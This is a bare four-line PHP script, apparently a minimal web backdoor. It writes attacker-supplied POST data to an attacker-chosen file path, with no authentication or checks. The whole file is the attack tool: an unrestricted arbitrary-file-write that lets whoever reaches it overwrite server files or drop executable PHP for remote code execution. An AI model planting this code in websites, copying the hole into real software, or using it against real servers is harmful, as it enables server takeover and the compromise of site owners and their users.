<?php
$data = $_POST['data'];
$path = $_POST['path'];
file_put_contents($path, $data);
?>